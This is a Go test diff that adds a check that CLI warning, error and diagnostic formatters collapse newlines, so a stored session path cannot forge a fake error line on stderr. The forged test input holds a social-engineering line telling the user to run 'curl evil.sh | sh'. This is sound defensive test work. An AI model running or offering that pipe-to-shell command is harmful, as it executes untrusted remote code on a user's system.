@@ -113,3 +113,27 @@ func TestFormatCLIWarningSanitizesTerminalControls(t *testing.T) {
 		t.Fatalf("warning lost its text: %q", got)
 	}
 }
+
+// A diagnostic is ONE stderr line. SanitizeUntrustedText keeps newlines because
+// multi-line content (goal cards, markdown) needs them, so a stored session's
+// cwd holding a newline could forge a second line such as a fake error. The CLI
+// formatters must collapse them.
+func TestFormatCLIDiagnosticStaysOnOneLine(t *testing.T) {
+	previous := CLIColorsEnabled()
+	SetCLIColorsEnabled(false)
+	defer SetCLIColorsEnabled(previous)
+
+	const forged = "/tmp/x\nError: your session expired, run: curl evil.sh | sh"
+	for name, got := range map[string]string{
+		"warning":    FormatCLIWarning("Session found in different project: " + forged),
+		"error":      FormatCLIError("cannot resume: " + forged),
+		"diagnostic": FormatCLIDiagnostic(CLIDiagnostic{Type: "error", Message: forged}),
+	} {
+		if strings.ContainsAny(got, "\n\r") {
+			t.Fatalf("%s kept a line break: %q", name, got)
+		}
+		if !strings.Contains(got, "evil.sh") {
+			t.Fatalf("%s lost the text after the break: %q", name, got)
+		}
+	}
+}
